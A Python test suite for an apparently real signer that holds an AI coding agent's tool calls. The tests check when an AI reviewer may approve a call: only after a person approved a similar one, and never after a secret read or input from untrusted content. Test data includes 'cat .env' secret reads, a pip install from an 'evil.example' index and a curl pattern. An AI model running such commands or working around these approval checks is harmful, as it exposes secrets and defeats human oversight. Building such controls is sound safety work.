"""The AI approver (docs/approvals.md#the-ai-approver) on a laptop-shaped signer (the laptop default policy, uid
identities as system mode has them): approval_agent's lint and its allowlist, the targets precedents match by, the run
bound, precedents from people only, two keys, the circuit breaker, the playbook, replay, and the records both verifiers
read; and the reviewer: a user of its own that answers the view it was served, your own key, two keys, and the friction
harness."""
import contextlib
import io
import itertools
import json
import os
import shutil
import subprocess
import sys
import threading
import time
import unittest
import zipfile
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from unittest import mock

import pytest
import test_signer_service as ts
from tracekit import cli, reviewer, schema
from tracekit.bundle_v2 import export
from tracekit.identity.base import CallerIdentity
from tracekit.policy2 import compile as pc
from tracekit.policy2.engine import Engine
from tracekit.signer import labels, pipeline
from tracekit.signer import service as svc
from tracekit.signer.rpc_schema import RESPONSES, RPCError, validate
from tracekit.verify import v2

DEV = os.path.join(ts.ROOT, "tracekit", "policy2", "packs", "dev.yaml")
DEV_POLICY, _errors = pc.build(DEV)
assert not _errors, _errors
AGENT = ts.ME   # the agent's own user: it owns the project the reviewer reads
REVIEWER, ALICE = CallerIdentity("uid", "990299", True), CallerIdentity("uid", "990001", True)
OPS = CallerIdentity("token", "ops", True)
INDEX = "pip install --index-url https://pypi.internal/simple {}"
# a hold of a reviewed rule alone that sends nothing: after a secret read, an install (a send) is also TK-Q001's
HELD = "$X run"
TWO = {"answers": [{"model": "m-a", "decision": "approve"}, {"model": "m-b", "decision": "approve"}]}
_ids = itertools.count()


def rid():
    return f"r{next(_ids)}"


def laptop(**over):
    """dev.yaml with approval_agent (`over` replaces its keys), as an operator's policy extending it would compile."""
    return dict(DEV_POLICY, approval_agent={"mode": "enforce", "rules": list(pc.APPROVER_RULES),
                                            "run": {"clean": ["secrets_access"]}, **over})


ENGINES = {}


def engine(**over):
    key = json.dumps(over, sort_keys=True)
    if key not in ENGINES:   # compiling the laptop default takes a while: once per shape
        ENGINES[key] = Engine(laptop(**over))
    return ENGINES[key]


class Case(unittest.TestCase):
    policy = {}   # approval_agent overrides
    approvals = {"approvers": [f"uid:{ALICE.subject}"], "persons": {f"uid:{ALICE.subject}": "alice"},
                 "agents": [f"uid:{REVIEWER.subject}"], "self_approval": "deny"}

    def setUp(self):
        self.dir = ts.tmpdir(self)
        self.s = self.open()
        self.run, self.seq = self.register()

    def open(self):
        s = svc.SignerService(self.dir, policy=engine(**self.policy), identity=AGENT, approvals=self.approvals,
                              authorize={f"uid:{REVIEWER.subject}": sorted(svc.AGENT_METHODS),
                                         "token:ops": ["run_hold", "approval_agents"]},
                              analyzers=[f"uid:{AGENT.subject}"])
        self.addCleanup(s.close)
        return s

    def restart(self):
        self.s.close()
        self.s = self.open()

    def register(self, **kw):
        r = self.s.call(AGENT, "register_run", {"request_id": rid(), "agent": {"name": "claude-code"}, **kw})
        return {"run_id": r["run_id"], "run_token": r["run_token"]}, itertools.count()

    def ask(self, cmd="pip", tcid=None, project="/Users/me/api", run=None, tool="Bash"):
        """Decide a call (Bash `cmd`; "pip": an install from the internal index) and request its approval: (approval
        id, its state), or (None, the decision) when it isn't held."""
        run, seq = run or (self.run, self.seq)
        tcid = tcid or rid()
        args = {"command": INDEX.format(tcid) if cmd == "pip" else cmd}
        d = self.s.call(AGENT, "decide", {"request_id": rid(), **run, "stream": "s", "client_seq": next(seq),
                                         "tool_call_id": tcid, "tool": tool, "args_source": "parsed", "args": args})
        if d["decision"] != "ask":
            return None, d
        aid = self.s.call(AGENT, "approval_request", {"request_id": rid(), **run, "tool_call_id": tcid,
                                                      **({"project": project} if project else {})})["approval_id"]
        return aid, self.s.log.approvals[aid]

    def person(self, aid, decision="approve", who=ALICE, **kw):
        return self.s.call(who, "approval_decide", {"request_id": rid(), "approval_id": aid, "decision": decision, **kw})

    def ai(self, aid, decision="approve", ai=TWO, **kw):
        """The reviewer's answer, as tracekit reviewer gives it: to the view approval_review served it."""
        served = self.s.call(REVIEWER, "approval_review", {"approval_id": aid})["view_digest"]
        out = self.s.call(REVIEWER, "approval_decide", {"request_id": rid(), "approval_id": aid, "decision": decision,
                                                        "asserted": {"model": "m-a", "version": "1"},
                                                        "view_digest": served, **({"ai": ai} if ai else {}), **kw})
        self.assertEqual(validate(RESPONSES["approval_decide"], out), [], out)
        return out

    @contextlib.contextmanager
    def an_hour_on(self):
        """The signer's label lookups (labels_for, labels_of) read with a clock label_inherit_s (an hour by default)
        and a second ahead."""
        f, o = labels.labels_for, labels.labels_of
        with mock.patch.object(labels, "labels_for", lambda log, run, now=None: f(log, run, now=time.time() + 3601)), \
                mock.patch.object(labels, "labels_of", lambda log, who, now=None: o(log, who, now=time.time() + 3601)):
            yield

    def precedent(self, cmd="pip", project="/Users/me/api", decision="approve", **kw):
        """A person's answer that counts as a precedent: asked in a run of its own, answered by Alice."""
        aid, _ = self.ask(cmd, project=project, run=self.register(), **kw)
        self.person(aid, decision, reason=f"{decision}d by alice")
        return aid

    def refused(self, code, who, method, req):
        with self.assertRaises(RPCError) as cm:
            self.s.call(who, method, req)
        self.assertEqual(cm.exception.code, code, cm.exception.message)
        return cm.exception.message

    def consume(self, aid, run=None):
        a = self.s.log.approvals[aid]
        run = run or self.run
        return self.s.approval_consume({"request_id": rid(), **run, "tool_call_id": a["tool_call_id"], "attempt": 0,
                                        "tool": "Bash", "args_source": "parsed",
                                        "args": {"command": INDEX.format(a["tool_call_id"])}})

    def events(self):
        self.s.close()
        es = [r["event"] for r in ts.records(self.dir)]
        for e in es:
            self.assertEqual(schema.validate(e), [], e)
        return es


class TestLint(unittest.TestCase):
    def errors(self, pol):
        return [e for e in pc._lint(pol, "p") if "approval_agent" in e]

    def test_the_reviewed_list_lints_clean_and_a_loose_run_bound_warns(self):
        self.assertEqual(self.errors(laptop()), [])
        self.assertEqual([w for w in pc.warnings(laptop()) if "approval_agent" in w],
                         ["approval_agent: run.clean leaves out untrusted_content: a run that carries it still gets AI "
                          "answers"])
        self.assertEqual([w for w in pc.warnings(laptop(run={"clean": ["untrusted_content", "secrets_access"]}))
                          if "approval_agent" in w], [])

    def test_every_class_never_eligible_is_an_error(self):
        mine = {"tools": {**DEV_POLICY["tools"], "send_money": "payment"}, "ask": DEV_POLICY["ask"] + [
            {"id": "MY-UNTRUSTED", "class": "shell", "field": "line", "pattern": "curl", "from": "untrusted"},
            {"id": "MY-PAY", "class": "payment", "pattern": "^"},
            {"id": "MY-PAY-TOOL", "tool": "send_money", "pattern": "^"},
            {"id": "MY-GUARD", "class": "shell", "field": "tracekit", "pattern": "^"},
            {"id": "MY-PUSH", "class": "shell", "field": "push", "pattern": "^"},
            {"id": "MY-PASSKEY", "class": "shell", "pattern": "x", "approval": {"passkey": "required"}},
            {"id": "MY-FIELDS", "class": "shell", "pattern": "y", "approval": {"agent": {
                "mode": "shadow", "allow": {"fields": {"command": {"type": "string"}}}}}}]}
        for rule, words in (("TK-D007", "a deny rule"), ("MY-UNTRUSTED", "a `from: untrusted` rule"),
                            ("TK-A020", "a credential or secret read"), ("TK-A035", "a credential or secret read"),
                            ("TK-A053", "a credential or secret read"), ("TK-A056", "a push or merge to main"),
                            ("TK-A033", "a push or merge to main"), ("MY-PAY", "a payment rule"),
                            ("MY-PAY-TOOL", "a payment rule"), ("MY-GUARD", "one of Tracekit's own guardrails"),
                            ("MY-PUSH", "a push"), ("MY-PASSKEY", "a passkey rule"),
                            ("MY-FIELDS", "it has an approval.agent of its own"),
                            ("TK-A032", "not on the reviewed list"), ("NO-SUCH-RULE", "not on the reviewed list")):
            with self.subTest(rule):
                [e] = self.errors(dict(laptop(rules=[rule]), **mine))
                self.assertIn(f"{rule}: {words}", e)
                self.assertTrue(e.endswith("people answer it"), e)
        [e] = self.errors(dict(laptop(rules=["TK-SHELL-PARSE"]), on_parse_error="deny"))
        self.assertIn("on_parse_error denies it", e)
        [e] = self.errors(dict(laptop(rules=["TK-A025"]), ask=[r for r in DEV_POLICY["ask"] if r["id"] != "TK-A025"]))
        self.assertIn("TK-A025: not an ask rule of this policy", e)
        for bad, words in (({"mode": "on"}, "mode must be"), ({"run": {"clean": []}}, "run must be"),
                           ({"run": {"clean": ["web"]}}, "run must be"), ({"run": {}}, "run must be"),
                           ({"rules": []}, "rules must list"), ({"veto_s": 0}, "veto_s"), ({"budget": 1}, "takes")):
            with self.subTest(bad):
                self.assertTrue(any(words in e for e in self.errors(laptop(**bad))), self.errors(laptop(**bad)))

    def test_the_signer_needs_agents_and_refuses_an_unbound_payment_on_a_laptop(self):
        d = ts.tmpdir(self)
        with self.assertRaisesRegex(ValueError, "approvals.agents names none"):
            svc.SignerService(d, policy=engine(), approvals={"approvers": ["uid:1"], "persons": {"uid:1": "a"}})
        pay = {"tools": {"pay": "payment"}, "ask": [{"id": "PAY", "class": "payment", "pattern": "^", "approval": {
            "agent": {"mode": "enforce", "allow": {"fields": {"amount": {"type": "integer"}}}}}}]}
        conf = {"approvers": ["uid:1"], "persons": {"uid:1": "a"}}
        with self.assertRaisesRegex(ValueError, "PAY: approval.agent on a payment tool without executor t2.*laptop"):
            svc.SignerService(d, policy=Engine(pay), approvals={**conf, "agents": ["uid:7"]})
        s = svc.SignerService(d, policy=Engine(pay), approvals={**conf, "agents": ["token:reviewer"]})   # a warning
        s.close()


class TestTargets(unittest.TestCase):
    e = None

    @classmethod
    def setUpClass(cls):
        cls.e = engine()

    def test_what_each_reviewed_rule_reads(self):
        self.assertEqual(self.e.target(["TK-A025"], "Bash", {"command": "pip install -i https://u:pw@PyPI.Example:8443"
                                                                         "/simple/ x"}),
                         {"TK-A025": ["pip --index-url https://pypi.example:8443/simple/"]})   # no password or case
        self.assertEqual(self.e.target(["TK-A025"], "Bash", {"command": INDEX.format("a")}),
                         self.e.target(["TK-A025"], "Bash", {"command": INDEX.format("b")}))   # any package
        self.assertEqual(self.e.target(["TK-A062", "TK-UNKNOWN-TOOL"], "run_tool", {"command": "make  test"}),
                         {"TK-A062": ["CMD:make  test"]})   # exactly as given
        self.assertEqual(self.e.target(["TK-SHELL-PARSE"], "Bash", {"command": "$PY -m pytest"}),
                         {"TK-SHELL-PARSE": ["$PY -m pytest"]})
        self.assertIsNone(self.e.target(["TK-SHELL-PARSE"], "Bash", {"command": ["not", "text"]}))
        self.assertIsNone(self.e.target(["TK-A025"], "Bash", {"command": "ls"}))   # no index read
        self.assertIsNone(self.e.target(["TK-SHELL-PARSE", "TK-A025"], "Bash", {   # a line it can't parse
            "command": INDEX.format("'x")}))
        for rule in pc.APPROVER_RULES:   # the reviewed list is exactly the rules a target is read for
            with self.subTest(rule):
                self.assertIn(rule, self.e.target([rule], "run_tool" if rule == "TK-A062" else "Bash", {
                    "command": {"TK-A025": INDEX.format("x"), "TK-A062": "make", "TK-SHELL-PARSE": "$X"}[rule]}))
        self.assertEqual(self.e.target(["TK-A032"], "Bash", {"command": "gsutil cp x gs://b"}), {})

    def test_a_claimed_project_only_narrows_a_match(self):
        """The project is the agent's process's word: keys that match with their projects match without them."""
        tools, targets = ("Bash", "run_tool"), ({"TK-A025": ["https://a/"]}, {"TK-A025": ["https://b/"]},
                                                {"TK-SHELL-PARSE": ["$X"]}, {"TK-A025": ["https://a/"],
                                                                             "TK-SHELL-PARSE": ["$X"]})
        projects = (None, "/u/api", "/v/api", "/u/web", "/u/api/")
        calls = list(itertools.product(tools, targets, projects))
        for a, b in itertools.product(calls, calls):
            with_project = svc.precedent_key(*a)[1] == svc.precedent_key(*b)[1]
            without = svc.precedent_key(a[0], a[1], None)[1] == svc.precedent_key(b[0], b[1], None)[1]
            self.assertTrue(not with_project or without, (a, b))
        self.assertNotEqual(svc.precedent_key("Bash", targets[0], "/u/api")[0]["project"],
                            svc.precedent_key("Bash", targets[0], "/v/api")[0]["project"])   # same name, two folders


    def test_a_source_is_read_with_how_it_was_selected(self):
        """--extra-index-url and --find-links add a source beside pypi.org's, so neither reads as an --index-url; a
        source that is no http(s) URL with a host and port it can read (a relative path the agent writes) reads as
        nothing, and people answer it."""
        def target(cmd):
            return self.e.target(["TK-A025"], "Bash", {"command": cmd})
        index = {"TK-A025": ["pip --index-url https://pypi.internal/simple"]}
        for cmd, want in ((INDEX.format("x"), index), ("pip install -i https://pypi.internal/simple x", index),
                          ("pip install --extra-index-url https://pypi.internal/simple x",
                           {"TK-A025": ["pip --extra-index-url https://pypi.internal/simple"]}),
                          ("pip install -f https://pypi.internal/simple x",
                           {"TK-A025": ["pip --find-links https://pypi.internal/simple"]}),
                          ("PIP_INDEX_URL=https://pypi.internal/simple pip install x",
                           {"TK-A025": ["PIP_INDEX_URL https://pypi.internal/simple"]}),
                          ("pip install --index-url 'https://h/a b' x", {"TK-A025": ["pip --index-url https://h/a%20b"]}),
                          ("pip install --index-url 'http://[::1]:8080/s' x",
                           {"TK-A025": ["pip --index-url http://[::1]:8080/s"]}),
                          ("pip install -f ./wheels x", None), ("cd /tmp/e && pip install -f ./wheels x", None),
                          ("pip install --index-url file:///tmp/simple x", None),
                          ("pip install --index-url ftp://mirror.internal/simple x", None),   # a host, not http(s)
                          ("pip install --index-url 'http://h:99999/s' x", None),
                          ("pip install --index-url 'http://[::1/s' x", None),
                          ("pip install --index-url 'http://a b/s' x", None)):
            with self.subTest(cmd):
                self.assertEqual(target(cmd), want)
        for cmd, added in (("--extra-index-url https://pypi.org/simple", "pip --extra-index-url https://pypi.org/simple"),
                           ("-f https://pypi.org/simple", "pip --find-links https://pypi.org/simple"),
                           ("--extra-index-url https://PyPI.org/simple/", "pip --extra-index-url https://pypi.org/simple/"),
                           ("--index-url https://pypi.org/simple", "pip --index-url https://pypi.org/simple")):
            with self.subTest(cmd):   # the default index beside the one a person vetted: where a package may come from
                self.assertEqual(target(f"pip install --index-url https://pypi.internal/simple {cmd} x"),
                                 {"TK-A025": sorted([added, "pip --index-url https://pypi.internal/simple"])})
        self.assertEqual(target("PIP_EXTRA_INDEX_URL=https://pypi.org/simple " + INDEX.format("x")),
                         {"TK-A025": ["PIP_EXTRA_INDEX_URL https://pypi.org/simple",
                                      "pip --index-url https://pypi.internal/simple"]})
        for cmd, want in (("pip config set global.extra-index-url https://pypi.org/simple",
                           "pip config global.extra-index-url https://pypi.org/simple"),
                          ("npm install --@acme:registry=https://registry.npmjs.org x",
                           "npm --@acme:registry https://registry.npmjs.org")):
            with self.subTest(cmd):   # a config key and a scope's registry name the default as well
                self.assertEqual(target(cmd), {"TK-A025": [want]})

class TestPrecedent(Case):
    def test_people_answer_until_a_person_answered_a_call_like_it(self):
        aid, a = self.ask()
        self.assertFalse(a["agent"]["eligible"])
        self.assertIn("no person has approved a call like this one yet", a["agent"]["reason"])
        self.assertEqual(self.s.call(REVIEWER, "approval_list", {"for": "agent"})["approvals"], [])
        self.assertEqual((a["ai"]["clean"], a["ai"]["asserted"], a["ai"]["key"]["project"][:5]),
                         (True, ["project"], "api ("))
        self.person(aid)   # Alice's answer is now a precedent
        aid2, a2 = self.ask()
        self.assertTrue(a2["agent"]["eligible"], a2["agent"])
        self.assertEqual(a2["ai"]["precedents"], {"approve": [aid], "reject": []})
        self.assertEqual(self.ai(aid2)["state"], "approved")

    def test_a_precedent_matches_the_same_target_project_and_requester_only(self):
        p = self.precedent()
        for what, cmd, project, run in (
                ("another index", "pip install --index-url https://evil.example/simple x", "/Users/me/api", None),
                ("another project", "pip", "/Users/me/web", None), ("no project", "pip", None, None),
                ("another requester", "pip", "/Users/me/api", "other")):
            with self.subTest(what):
                if run == "other":
                    other = CallerIdentity("uid", "990777", True)
                    r = self.s.call(other, "register_run", {"request_id": rid(), "agent": {"name": "x"}})
                    run = ({"run_id": r["run_id"], "run_token": r["run_token"]}, itertools.count())
                    with mock.patch.object(svc, "subject", side_effect=lambda i: f"{i.scheme}:{i.subject}"):
                        pass
                    tcid = rid()
                    self.s.call(other, "decide", {"request_id": rid(), **run[0], "stream": "s", "client_seq": 0,
                                                  "tool_call_id": tcid, "tool": "Bash", "args_source": "parsed",
                                                  "args": {"command": INDEX.format("x")}})
                    aid = self.s.call(other, "approval_request", {"request_id": rid(), **run[0], "tool_call_id": tcid,
                                                                  "project": project})["approval_id"]
                    a = self.s.log.approvals[aid]
                else:
                    _, a = self.ask(cmd, project=project, run=run)
                self.assertFalse(a["agent"]["eligible"], what)
                self.assertEqual(a["ai"]["precedents"], {"approve": [], "reject": []})
        _, a = self.ask()
        self.assertEqual(a["ai"]["precedents"]["approve"], [p])

    def test_a_reject_lets_the_ai_reject_but_never_approve(self):
        self.precedent(decision="reject")
        aid, a = self.ask()
        self.assertTrue(a["agent"]["eligible"])
        out = self.ai(aid)   # an always-approve reviewer, two keys
        self.assertEqual((out["state"], out.get("escalated")), ("requested", True))
        aid, _ = self.ask()
        self.assertEqual(self.ai(aid, "reject", ai={"answers": [{"model": "m", "decision": "reject"}]})["state"],
                         "rejected")

    def test_what_counts_when_the_ai_answers_not_when_it_was_asked(self):
        p = self.precedent()
        gone, _ = self.ask()   # eligible now; its precedent is revoked, and the rule enabled again, before the answer
        self.s.call(ALICE, "approver", {"request_id": rid(), "action": "revoke", "id": p})
        self.s.call(ALICE, "approver", {"request_id": rid(), "action": "enable", "rules": ["TK-A025"]})
        out = self.ai(gone)
        self.assertEqual((out["state"], out.get("escalated")), ("requested", True))
        self.precedent()
        rejected, _ = self.ask()   # eligible now; a person rejects a call like it before the answer
        self.precedent(decision="reject")
        out = self.ai(rejected)
        self.assertEqual((out["state"], out.get("escalated")), ("requested", True))
        reasons = [e["data"]["reason"] for e in self.events() if e["type"] == "approval.escalated"]
        self.assertEqual([r[:40] for r in reasons], ["the person's approval it matched no long",
                                                     "a person rejected a call like this one: "])

    def test_people_who_answered_both_ways_answer_it(self):
        self.precedent()
        self.precedent(decision="reject")
        _, a = self.ask()
        self.assertEqual((a["agent"]["eligible"], a["agent"]["reason"]),
                         (False, "people have answered calls like this one both ways: a person decides"))

    def test_an_answer_is_no_precedent_unless_a_clean_runs_and_a_persons(self):
        run = self.register()
        self.ask("cat .env", run=run)   # a secret read: the run now carries secrets_access
        aid, a = self.ask(HELD, run=run)
        self.assertEqual((a["ai"]["clean"], a["ai"]["labels"]), (False, ["secrets_access"]))
        self.person(aid)
        _, a = self.ask(HELD)
        self.assertEqual(a["ai"]["precedents"]["approve"], [])   # a person's answer in a run that read a secret
        self.assertEqual(self.s.log.agent["precedents"], {})

    def test_a_self_approval_is_no_precedent(self):
        self.s.close()
        self.approvals = {**Case.approvals, "approvers": [f"uid:{ALICE.subject}", f"uid:{AGENT.subject}"],
                          "persons": {f"uid:{ALICE.subject}": "alice", f"uid:{AGENT.subject}": "me"},
                          "self_approval": "allow"}
        self.s = self.open()
        self.run, self.seq = self.register()
        aid, _ = self.ask()
        self.assertTrue(self.person(aid, who=AGENT)["self_approved"])
        self.assertEqual(self.s.log.agent["precedents"], {})


    def test_an_extra_index_or_find_links_never_rides_an_index_url_precedent(self):
        self.precedent()   # an --index-url install, approved by Alice
        for cmd in ("pip install --extra-index-url https://pypi.internal/simple x",
                    "pip install -f https://pypi.internal/simple x", "pip install -f ./wheels x",
                    INDEX.format("--extra-index-url https://pypi.org/simple x"),
                    "PIP_EXTRA_INDEX_URL=https://pypi.org/simple " + INDEX.format("x"),
                    INDEX.format("-f https://pypi.org/simple x"),
                    INDEX.format("--extra-index-url https://PyPI.org/simple/ x")):
            with self.subTest(cmd):
                _, a = self.ask(cmd)
                self.assertFalse(a["agent"]["eligible"], a["agent"])
        _, a = self.ask("pip install -i https://pypi.internal/simple x")   # the same option by its short name
        self.assertTrue(a["agent"]["eligible"], a["agent"])

    def test_a_break_glass_change_to_the_approver_needs_a_reason(self):
        self.s.close()
        glass = CallerIdentity("uid", "990555", True)
        self.approvals = {**Case.approvals, "break_glass": [f"uid:{glass.subject}"]}
        self.s = self.open()
        req = {"request_id": rid(), "action": "enable", "rules": ["TK-A025"]}
        self.assertIn("only with a reason", self.refused("forbidden", glass, "approver", req))
        self.refused("invalid_request", glass, "approver", {**req, "request_id": rid(), "reason": "on call"})   # past it
        self.refused("invalid_request", ALICE, "approver", {**req, "request_id": rid()})   # an approver needs none
        self.assertIn("demoted", self.s.call(glass, "approver", {"action": "status"}))   # a read needs none

    def test_a_break_glass_answer_is_no_precedent(self):
        self.s.close()
        glass = CallerIdentity("uid", "990555", True)
        self.approvals = {**Case.approvals, "break_glass": [f"uid:{glass.subject}"]}
        self.s = self.open()
        self.run, self.seq = self.register()
        aid, _ = self.ask(run=self.register())
        self.person(aid, who=glass, reason="on call")
        self.assertEqual(self.s.log.agent["precedents"], {})
        _, a = self.ask()
        self.assertIn("no person has approved a call like this one yet", a["agent"]["reason"])
        [ans] = [e["data"] for e in self.events() if e["type"] == "approval" and e["data"]["approval_id"] == aid]
        self.assertIs(ans["break_glass"], True)

    def test_a_secret_read_before_the_person_answered_makes_no_precedent(self):
        aid, a = self.ask(run=self.register())
        self.assertTrue(a["ai"]["clean"])   # clean when asked
        self.ask("cat .env")   # then a run of the same requester reads a secret
        self.person(aid)
        self.assertEqual(self.s.log.agent["precedents"], {})
        [ans] = [e["data"] for e in self.events() if e["type"] == "approval" and e["data"]["approval_id"] == aid]
        self.assertIs(ans["run_clean"], False)

class TestRunBound(Case):
    def test_a_run_that_read_a_secret_sends_every_hold_to_people(self):
        self.precedent(HELD)
        reader = self.register()
        self.ask("cat .env", run=reader)
        aid, a = self.ask(HELD)
        self.assertEqual(a["agent"]["reason"], "the session read a secret: a person decides")
        for continues in (False, True):   # any run of the requester, afresh or not
            with self.subTest(continues=continues):
                _, a = self.ask(HELD, run=self.register(**({"continues": True} if continues else {})))
                self.assertEqual((a["agent"]["eligible"], a["ai"]["labels"]), (False, ["secrets_access"]))
        other = CallerIdentity("uid", "990777", True)   # another requester's runs don't carry it
        r = self.s.call(other, "register_run", {"request_id": rid(), "agent": {"name": "x"}})
        run = {"run_id": r["run_id"], "run_token": r["run_token"]}
        self.s.call(other, "decide", {"request_id": rid(), **run, "stream": "s", "client_seq": 0, "tool_call_id": "o1",
                                      "tool": "Bash", "args_source": "parsed", "args": {"command": INDEX.format("o1")}})
        aid = self.s.call(other, "approval_request", {"request_id": rid(), **run, "tool_call_id": "o1"})["approval_id"]
        self.assertEqual(self.s.log.approvals[aid]["ai"]["labels"], [])

    def test_a_run_that_continues_an_earlier_one_carries_every_label_of_the_bound(self):
        self.precedent(HELD)
        _, a = self.ask(HELD, run=self.register(continues=True))   # it can't see what the earlier run read
        clean = self.s.policy.policy["approval_agent"]["run"]["clean"]
        self.assertEqual((a["agent"]["eligible"], a["ai"]["labels"]), (False, sorted(clean)))
        _, a = self.ask(HELD, run=self.register())
        self.assertEqual((a["agent"]["eligible"], a["ai"]["labels"]), (True, []))

    def test_the_label_holds_for_label_inherit_s_after_the_run_that_read_ends(self):
        self.precedent(HELD)
        reader = self.register()
        self.ask("cat .env", run=reader)
        heir = self.register()
        with self.an_hour_on():   # while the run that read it is open, whatever the window
            _, a = self.ask(HELD, run=heir)
        self.assertEqual(a["ai"]["labels"], ["secrets_access"])
        for run in (reader, heir):   # a run that inherited it carries it on while open, too
            self.s.call(AGENT, "close_run", {"request_id": rid(), **run[0]})
        with self.an_hour_on():   # past it (an hour by default): clean again
            _, a = self.ask(HELD, run=self.register())
        self.assertEqual((a["agent"]["eligible"], a["ai"]["labels"]), (True, []))
        _, a = self.ask(HELD, run=self.register())   # within it: held
        self.assertEqual((a["agent"]["eligible"], a["ai"]["labels"]), (False, ["secrets_access"]))

    def principal_switch(self, first, then):
        """A secret read in a run registered with `first`, then a hold in a fresh run registered with `then`."""
        self.s.oidc = mock.Mock(validate=lambda t: CallerIdentity("oidc", "iss/" + t, True, {"person": "oidc:" + t}))
        self.precedent(HELD)
        reader, fresh = self.register(**first), None
        self.ask("cat .env", run=reader)
        fresh = self.register(**then)
        people = [self.s.log.runs[("default", r[0]["run_id"])]["people"][1] for r in (reader, fresh)]
        _, a = self.ask(HELD, run=fresh)
        return people, a

    def test_a_secret_read_under_a_principal_holds_the_requesters_runs_without_one(self):
        people, a = self.principal_switch({"principal_token": "alice"}, {})
        self.assertEqual((people[0] is not None, people[1]), (True, None))
        self.assertEqual((a["agent"]["eligible"], a["ai"]["labels"]), (False, ["secrets_access"]))

    def test_a_secret_read_without_a_principal_holds_the_requesters_runs_under_one(self):
        people, a = self.principal_switch({}, {"principal_token": "mallory"})
        self.assertEqual((people[0], people[1] is not None), (None, True))
        self.assertEqual((a["agent"]["eligible"], a["ai"]["labels"]), (False, ["secrets_access"]))

    def test_events_a_run_lost_send_every_hold_of_the_requester_to_people(self):
        self.precedent(HELD)
        run, seq = self.register()
        next(seq)
        next(seq)   # client_seq 0 and 1 never reach the signer: a client_counter_gap
        aid, a = self.ask(HELD, run=(run, seq))
        self.assertEqual((a["agent"]["eligible"], a["ai"]["labels"]), (False, ["secrets_access"]))
        _, a = self.ask(HELD, run=self.register())
        self.assertFalse(a["agent"]["eligible"])

    def test_a_label_taken_after_the_ai_approved_withdraws_it_before_it_runs(self):
        self.precedent()
        aid, _ = self.ask()
        self.assertEqual(self.ai(aid)["state"], "approved")
        self.ask("cat .env")
        out = self.consume(aid)
        self.assertEqual((out["ok"], out["rule_ids"]), (False, ["TK-APPROVAL-REJECTED"]))
        self.assertIn("the session read a secret since it was", out["reason"])
        self.assertEqual(self.s.log.agent["demoted"], {})   # the signer's own withdrawal trips no breaker
        [rev] = [e for e in self.events() if e["type"] == "approval.revoked"]
        self.assertEqual((rev["data"]["approval_id"], rev["data"]["by"]), (aid, "signer"))

    def test_a_label_taken_before_the_ai_answers_sends_it_to_people(self):
        self.precedent()
        aid, a = self.ask()
        self.assertTrue(a["agent"]["eligible"])
        self.ask("cat .env")
        msg = self.refused("forbidden", REVIEWER, "approval_decide", {"request_id": rid(), "approval_id": aid,
                                                                      "decision": "approve", "ai": TWO})
        self.assertIn("the session read a secret since it was", msg)
        self.assertEqual(self.s.call(REVIEWER, "approval_list", {"for": "agent"})["approvals"], [])

    def test_a_call_whose_target_cant_be_read_is_peoples(self):
        self.precedent(INDEX.format("'x"))
        _, a = self.ask(INDEX.format("'x"))
        self.assertIn("what the call acts on can't be read", a["agent"]["reason"])
        self.assertIsNone(a["ai"])

    def test_a_value_only_untrusted_content_brought_sends_it_to_people(self):
        self.precedent()
        cmd = INDEX.format("from-the-page")
        self.s.call(AGENT, "observe", {"request_id": rid(), **self.run, "stream": "s", "client_seq": next(self.seq),
                                       "source": "web:1", "trust": "untrusted", "value": cmd})
        aid, a = self.ask(cmd, tcid="from-the-page")
        self.assertIn("only untrusted content brought", a["agent"]["reason"])
        self.assertFalse(a["ai"]["clean"])
        self.person(aid)
        self.assertNotIn(aid, self.s.log.agent["precedents"])   # nor is a person's answer to it a precedent


    def test_a_rejection_after_the_ai_yes_withdraws_it_before_it_runs(self):
        self.precedent()
        aid, _ = self.ask()
        self.assertEqual(self.ai(aid)["state"], "approved")
        self.precedent(decision="reject")   # a person rejects a call like it before the yes is consumed
        out = self.consume(aid)
        self.assertEqual((out["ok"], out["rule_ids"]), (False, ["TK-APPROVAL-REJECTED"]))
        self.assertIn("a person rejected a call like this one", out["reason"])

    def test_a_yes_whose_precedents_aged_out_is_withdrawn_before_it_runs(self):
        self.precedent()
        aid, _ = self.ask()
        self.assertEqual(self.ai(aid)["state"], "approved")
        with mock.patch.object(svc, "PRECEDENT_S", 0):
            out = self.consume(aid)
        self.assertEqual((out["ok"], out["rule_ids"]), (False, ["TK-APPROVAL-REJECTED"]))
        self.assertIn("the person's approval it matched no longer counts", out["reason"])


class TestTenantsAnAppAsserts(Case):
    def open(self):
        s = svc.SignerService(self.dir, policy=engine(**self.policy), identity=AGENT, approvals=self.approvals,
                              authorize={f"uid:{REVIEWER.subject}": sorted(svc.AGENT_METHODS)},
                              multi_tenant_apps=[f"uid:{AGENT.subject}"])
        self.addCleanup(s.close)
        return s

    def test_a_secret_read_in_one_tenant_holds_the_requesters_runs_in_every_tenant(self):
        self.ask("cat .env")   # tenant default
        for tenant in ("t2", "default"):
            with self.subTest(tenant):
                r = self.s.call(AGENT, "register_run", {"request_id": rid(), "agent": {"name": "x"}, "tenant": tenant})
                self.assertEqual(self.s._run_labels(self.s.log.runs[(tenant, r["run_id"])], f"uid:{AGENT.subject}"),
                                 ["secrets_access"])


class TestDelegatedRuns(Case):
    """A run another identity registers and delegates to the agent: the agent is one of its requesters."""
    OTHER = CallerIdentity("uid", "990777", True)

    def open(self):
        s = svc.SignerService(self.dir, policy=engine(**self.policy), identity=AGENT, approvals=self.approvals,
                              authorize={f"uid:{REVIEWER.subject}": sorted(svc.AGENT_METHODS),
                                         f"uid:{AGENT.subject}": sorted(svc.DEFAULT_GRANTS)})
        self.addCleanup(s.close)
        return s

    def delegated(self):
        r = self.s.call(self.OTHER, "register_run", {"request_id": rid(), "agent": {"name": "app"}})
        tok = self.s.call(self.OTHER, "delegate_run", {"run_id": r["run_id"], "run_token": r["run_token"],
                                                       "identity": f"uid:{AGENT.subject}"})
        return {"run_id": r["run_id"], "run_token": tok["run_token"]}, itertools.count()

    def test_a_secret_read_in_a_run_handed_to_the_agent_holds_the_agents_own_runs(self):
        self.precedent(HELD)
        handed = self.delegated()
        self.ask("cat .env", run=handed)   # the agent reads a secret in the run it was handed
        _, a = self.ask(HELD)   # and asks in its own run
        self.assertEqual((a["requester"], a["agent"]["eligible"], a["ai"]["labels"]),
                         (f"uid:{AGENT.subject}", False, ["secrets_access"]))

    def test_a_runs_requesters_are_its_owner_and_its_writers(self):
        self.assertEqual(labels.requesters({"owner": "uid:1", "writers": {"s": "uid:2", "g": "uid:3 through a gateway"}}),
                         {"uid:1", "uid:2", "uid:3"})   # a gateway's caller as the identity it calls for
